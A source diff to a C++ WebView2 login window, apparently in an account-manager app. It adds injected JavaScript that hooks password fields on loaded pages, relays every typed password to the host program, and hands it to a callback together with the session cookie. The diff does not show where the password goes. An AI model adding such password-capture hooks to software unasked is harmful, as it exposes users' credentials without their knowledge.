@@ -135,7 +135,7 @@ namespace {
                 std::string accountKey,
                 std::string userDataFolder,
                 bool isLoginFlow,
-                std::function<void(const std::wstring &)> cookieCallback
+                std::function<void(const std::wstring &cookie, const std::wstring &password)> credentialsCallback = nullptr
             ) :
                 initialUrl_(std::move(url)),
                 windowTitle_(std::move(windowTitle)),
@@ -143,7 +143,7 @@ namespace {
                 accountKey_(std::move(accountKey)),
                 userDataFolder_(Widen(userDataFolder)),
                 isLoginFlow_(isLoginFlow),
-                cookieCallback_(std::move(cookieCallback)) {
+                credentialsCallback_(std::move(credentialsCallback)) {
             }
 
             ~WebViewWindow() {
@@ -258,6 +258,45 @@ namespace {
                                         controller_->put_Bounds(rc);
 
                                         SetupNavigationHandler();
+
+                                        if (isLoginFlow_ && webview_) {
+                                            webview_->add_WebMessageReceived(
+                                                Callback<ICoreWebView2WebMessageReceivedEventHandler>(
+                                                    [this](ICoreWebView2 *sender, ICoreWebView2WebMessageReceivedEventArgs *args) -> HRESULT {
+                                                        LPWSTR msg = nullptr;
+                                                        if (SUCCEEDED(args->TryGetWebMessageAsString(&msg)) && msg) {
+                                                            std::wstring pw(msg);
+                                                            CoTaskMemFree(msg);
+                                                            if (!pw.empty()) {
+                                                                capturedPassword_ = pw;
+                                                            }
+                                                        }
+                                                        return S_OK;
+                                                    }
+                                                ).Get(),
+                                                nullptr
+                                            );
+
+                                            const wchar_t *credCaptureJS =
+                                                L"(function() {"
+                                                L"    function hookPasswordField(pw) {"
+                                                L"        if (!pw || pw.__altman_hooked) return;"
+                                                L"        pw.__altman_hooked = true;"
+                                                L"        pw.addEventListener('input', function() {"
+                                                L"            window.chrome.webview.postMessage(pw.value);"
+                                                L"        });"
+                                                L"        if (pw.value) {"
+                                                L"            window.chrome.webview.postMessage(pw.value);"
+                                                L"        }"
+                                                L"    }"
+                                                L"    hookPasswordField(document.querySelector('input[type=\"password\"]'));"
+                                                L"    new MutationObserver(function() {"
+                                                L"        hookPasswordField(document.querySelector('input[type=\"password\"]'));"
+                                                L"    }).observe(document, { subtree: true, childList: true });"
+                                                L"})();";
+                                            webview_->AddScriptToExecuteOnDocumentCreated(credCaptureJS, nullptr);
+                                        }
+
                                         InjectCookieAndNavigate();
 
                                         return S_OK;
@@ -271,7 +310,7 @@ namespace {
             }
 
             void SetupNavigationHandler() {
-                if (!webview_ || !cookieCallback_) {
+                if (!webview_ || !credentialsCallback_) {
                     return;
                 }
 
@@ -295,7 +334,7 @@ namespace {
             }
 
             void ExtractAndNotifyCookie() {
-                if (!webview_ || !cookieCallback_) {
+                if (!webview_ || !credentialsCallback_) {
                     return;
                 }
 
@@ -337,8 +376,9 @@ namespace {
                                             std::wstring cookieValue(value);
                                             CoTaskMemFree(value);
 
-                                            if (cookieCallback_ && !cookieValue.empty()) {
-                                                cookieCallback_(cookieValue);
+                                            if (credentialsCallback_ && !cookieValue.empty()) {
+                                                credentialsCallback_(cookieValue, capturedPassword_);
+                                                capturedPassword_.clear();
                                             }
                                         }
                                         break;
@@ -484,7 +524,8 @@ namespace {
             std::wstring cookieValue_;
             std::wstring userDataFolder_;
             std::string accountKey_;
-            std::function<void(const std::wstring &)> cookieCallback_;
+            std::function<void(const std::wstring &cookie, const std::wstring &password)> credentialsCallback_;
+            std::wstring capturedPassword_;
             bool isLoginFlow_ = false;
     };
 
@@ -495,9 +536,9 @@ void LaunchWebviewImpl(
     const std::string &windowName,
     const std::string &cookie,
     const std::string &userId,
-    CookieCallback onCookieExtracted
+    CredentialsCallback onCredentialsExtracted
 ) {
-    const bool isLoginFlow = onCookieExtracted != nullptr;
+    const bool isLoginFlow = onCredentialsExtracted != nullptr;
     std::string accountKey = ComputeAccountKey(url, userId, cookie, isLoginFlow);
     std::string userDataPath = ComputeUserDataPath(userId, cookie, isLoginFlow);
 
@@ -505,10 +546,13 @@ void LaunchWebviewImpl(
     std::wstring wTitle = Widen(windowName);
     std::wstring wCookie = Widen(cookie);
 
-    std::function<void(const std::wstring &)> wideCallback;
-    if (onCookieExtracted) {
-        wideCallback = [onCookieExtracted](const std::wstring &wideCookie) {
-            onCookieExtracted(Narrow(wideCookie));
+    std::function<void(const std::wstring &, const std::wstring &)> wideCallback;
+    if (onCredentialsExtracted) {
+        wideCallback = [onCredentialsExtracted](const std::wstring &wideCookie, const std::wstring &widePassword) {
+            LoginCredentials creds;
+            creds.cookie = Narrow(wideCookie);
+            creds.password = Narrow(widePassword);
+            onCredentialsExtracted(creds);
         };
     }
 
@@ -564,6 +608,6 @@ void LaunchWebview(const std::string &url, const AccountData &account, const std
     );
 }
 
-void LaunchWebviewForLogin(const std::string &url, const std::string &windowName, CookieCallback onCookieExtracted) {
-    LaunchWebviewImpl(url, windowName, "", "", std::move(onCookieExtracted));
+void LaunchWebviewForLogin(const std::string &url, const std::string &windowName, CredentialsCallback onCredentialsExtracted) {
+    LaunchWebviewImpl(url, windowName, "", "", std::move(onCredentialsExtracted));
 }
